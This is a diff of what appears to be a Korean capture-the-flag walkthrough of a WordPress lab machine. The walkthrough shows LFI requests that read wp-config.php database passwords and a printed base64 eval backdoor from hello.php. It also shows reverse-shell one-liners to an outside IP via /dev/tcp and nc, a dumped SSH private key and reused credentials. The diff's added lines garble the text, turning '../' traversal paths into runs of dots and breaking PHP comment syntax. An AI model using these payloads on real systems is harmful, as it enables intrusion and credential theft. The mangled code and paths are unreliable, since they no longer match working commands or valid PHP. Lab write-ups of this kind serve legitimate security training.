@@ -215,14 +215,14 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=s
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/9489e7ee-b9c5-4def-b337-13f30ef6321f/image.png)
 
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=...../wp-config.php
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/b10129e7-2e41-42c0-b15d-76ed89c0c5f3/image.png)
 
 ```
 
 <?php
-/**
+/
  * The base configuration for WordPress
  *
  * The wp-config.php creation script uses this file during the installation.
@@ -241,26 +241,26 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
  * @package WordPress
  */
 
-// ** Database settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
+//  Database settings - You can get this info from your web host  //
+/ The name of the database for WordPress */
 define( 'DB_NAME', 'wordpress' );
 
-/** Database username */
+/ Database username */
 define( 'DB_USER', 'wpuser' );
 
-/** Database password */
+/ Database password */
 define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
 
-/** Database hostname */
+/ Database hostname */
 define( 'DB_HOST', 'localhost' );
 
-/** Database charset to use in creating database tables. */
+/ Database charset to use in creating database tables. */
 define( 'DB_CHARSET', 'utf8' );
 
-/** The database collate type. Don't change this if in doubt. */
+/ The database collate type. Don't change this if in doubt. */
 define( 'DB_COLLATE', '' );
 
-/**#@+
+/#@+
  * Authentication unique keys and salts.
  *
  * Change these to different unique phrases! You can generate these using
@@ -280,9 +280,9 @@ define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
 define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
 define( 'NONCE_SALT',       'put your unique phrase here' );
 
-/**#@-*/
+/#@-*/
 
-/**
+/
  * WordPress database table prefix.
  *
  * You can have multiple installations in one database if you give each
@@ -290,7 +290,7 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  */
 $table_prefix = 'wp_';
 
-/**
+/
  * For developers: WordPress debugging mode.
  *
  * Change this to true to enable the display of notices during development.
@@ -310,12 +310,12 @@ define( 'WP_DEBUG', false );
 
 /* That's all, stop editing! Happy publishing. */
 
-/** Absolute path to the WordPress directory. */
+/ Absolute path to the WordPress directory. */
 if ( ! defined( 'ABSPATH' ) ) {
 	define( 'ABSPATH', __DIR__ . '/' );
 }
 
-/** Sets up WordPress vars and included files. */
+/ Sets up WordPress vars and included files. */
 require_once ABSPATH . 'wp-settings.php';
 
 ```
@@ -366,18 +366,18 @@ curl -i -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logg
 
 # hello dolly source code 구글링 -> https://github.com/WordPress/hello-dolly -> hello.php 플러그인 파일 확인
 
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=...../wp-config.php
 
 # LFI 파일을 기준으로 플러그인 파일 유추 -> 무작위 시도
 
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../hello.php
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../hello.php
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../hello.php
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../hello.php
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=......./hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=....../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=...../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=..../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=.../hello.php
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../hello.php
 
-# http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+# http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=.../hello.php
 
 # 플러그인 파일 구조 (php)
 
@@ -385,12 +385,12 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
 
 # 취약한 코드 및 base64 텍스트 발견 -> eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
 
-curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
+curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=.../hello.php" > hello.b64
 base64 -d hello.b64 > hello.php
 
 ```
 <?php
-/**
+/
  * @package Hello_Dolly
  * @version 1.7.2
  */
@@ -404,7 +404,7 @@ Author URI: http://ma.tt/
 */
 
 function hello_dolly_get_lyric() {
-	/** These are the lyrics to Hello Dolly */
+	/ These are the lyrics to Hello Dolly */
 	$lyrics = "Hello, Dolly
 Well, hello, Dolly
 It's so nice to have you back where you belong
@@ -634,20 +634,20 @@ menu.php
 
 curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
 
-2. **리버스 쉘 스크립트 작성**
+2. 리버스 쉘 스크립트 작성
 
 ```bash
 echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.136.212/1234 0>&1'" > rev.sh
 
 ```
 
-3. **공격자가 악성 스크립트 배포를 위한 서빙**
+3. 공격자가 악성 스크립트 배포를 위한 서빙
 
 ```bash
 python3 -m http.server 6666
 ```
 
-4. **타겟에서 스크립트 다운로드** -> 안전하게 /tmp 에 설치
+4. 타겟에서 스크립트 다운로드 -> 안전하게 /tmp 에 설치
 
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {Your IP} 4444 > /tmp/f
 
@@ -659,7 +659,7 @@ cat tmp.txt | batcat
 
 curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=ls | batcat
 
-5. **타겟에서 리버스 쉘 실행**
+5. 타겟에서 리버스 쉘 실행
 
 curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=sh /tmp/rev.sh
 curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=sh -i >& /dev/tcp/10.8.136.212/1234 0>&1
@@ -867,10 +867,10 @@ sandiegocalifornia (diego)
 
 # IP: 10.10.97.230
 
-### ✅ 원인: `su`는 **TTY (가상 터미널)** 가 필요합니다.
+### ✅ 원인: `su`는 TTY (가상 터미널) 가 필요합니다.
 
-- `su`는 **비밀번호 입력을 위해 /dev/tty 또는 stdin이 TTY인지 검사**합니다.
-- 리버스 쉘은 기본적으로 TTY가 **없기 때문에**, 비밀번호 입력 처리를 못 해서 **그냥 멈춰있는 것처럼 보입니다.**
+- `su`는 비밀번호 입력을 위해 /dev/tty 또는 stdin이 TTY인지 검사합니다.
+- 리버스 쉘은 기본적으로 TTY가 없기 때문에, 비밀번호 입력 처리를 못 해서 그냥 멈춰있는 것처럼 보입니다.
 
 ### ✔️ 1. Python을 통한 TTY 업그레이드
 
@@ -962,9 +962,9 @@ lrwxrwxrwx 1 root root 9 Aug 18 2023 .viminfo -> /dev/null
 diego@ip-10-10-97-230:~$ cd ../think
 diego@ip-10-10-97-230:/home/think$ ls
 diego@ip-10-10-97-230:/home/think$ cd .ssh
-diego@ip-10-10-97-230:/home/think/.ssh$ ls
+diego@ip-10-10-97-230:/home/thinkssh$ ls
 authorized_keys id_rsa id_rsa.pub
-diego@ip-10-10-97-230:/home/think/.ssh$ cat id_rsa
+diego@ip-10-10-97-230:/home/thinkssh$ cat id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAxGtoQjY5NUymuD+3b0xzEYIhdBbsnicrrnvkMjOgdbp8xYKrfOgM
@@ -1003,7 +1003,7 @@ PiFf+EnK994HuAkW2l3R36PN+BoOua7g1g1GHveMfB/nHh4zEB7rhYLFuDyZ//8IzuTaTN
 u742mQ/UfeT6NnCJWHTorNpJO1fOexq1kmFKCMncIINnk8ZF1BBRQZtfjMvJ44sj9Oi4aE
 81DXo7MfGm0bSFAAAAEnRoaW5rQHVidW50dXNlcnZlcg==
 -----END OPENSSH PRIVATE KEY-----
-diego@ip-10-10-97-230:/home/think/.ssh$
+diego@ip-10-10-97-230:/home/thinkssh$
 
 # IP: 10.10.97.230 -> SSH
 
@@ -1182,7 +1182,7 @@ license.txt wp-activate.php wp-blog-header.php wp-config.php wp-cron.php wp-link
 gege@ip-10-10-97-230:~/wordpress.old$ cat wp-config.php
 
 <?php
-/**
+/
  * The base configuration for WordPress
  *
  * The wp-config.php creation script uses this file during the installation.
@@ -1201,26 +1201,26 @@ gege@ip-10-10-97-230:~/wordpress.old$ cat wp-config.php
  * @package WordPress
  */
 
-// ** Database settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
+//  Database settings - You can get this info from your web host  //
+/ The name of the database for WordPress */
 define( 'DB_NAME', 'wordpress' );
 
-/** Database username */
+/ Database username */
 define( 'DB_USER', 'xavi' );
 
-/** Database password */
+/ Database password */
 define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
 
-/** Database hostname */
+/ Database hostname */
 define( 'DB_HOST', 'localhost' );
 
-/** Database charset to use in creating database tables. */
+/ Database charset to use in creating database tables. */
 define( 'DB_CHARSET', 'utf8' );
 
-/** The database collate type. Don't change this if in doubt. */
+/ The database collate type. Don't change this if in doubt. */
 define( 'DB_COLLATE', '' );
 
-/**#@+
+/#@+
  * Authentication unique keys and salts.
  *
  * Change these to different unique phrases! You can generate these using
@@ -1240,9 +1240,9 @@ define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
 define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
 define( 'NONCE_SALT',       'put your unique phrase here' );
 
-/**#@-*/
+/#@-*/
 
-/**
+/
  * WordPress database table prefix.
  *
  * You can have multiple installations in one database if you give each
@@ -1250,7 +1250,7 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  */
 $table_prefix = 'wp_';
 
-/**
+/
  * For developers: WordPress debugging mode.
  *
  * Change this to true to enable the display of notices during development.
@@ -1270,12 +1270,12 @@ define( 'WP_DEBUG', true );
 
 /* That's all, stop editing! Happy publishing. */
 
-/** Absolute path to the WordPress directory. */
+/ Absolute path to the WordPress directory. */
 if ( ! defined( 'ABSPATH' ) ) {
         define( 'ABSPATH', __DIR__ . '/' );
 }
 
-/** Sets up WordPress vars and included files. */
+/ Sets up WordPress vars and included files. */
 require_once ABSPATH . 'wp-settings.php';
 gege@ip-10-10-97-230:~/wordpress.old$
 
@@ -1283,7 +1283,7 @@ gege@ip-10-10-97-230:~/wordpress.old$
 # xavi
 define( 'DB_USER', 'xavi' );
 
-/** Database password */
+/ Database password */
 define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
 
 # su xavi
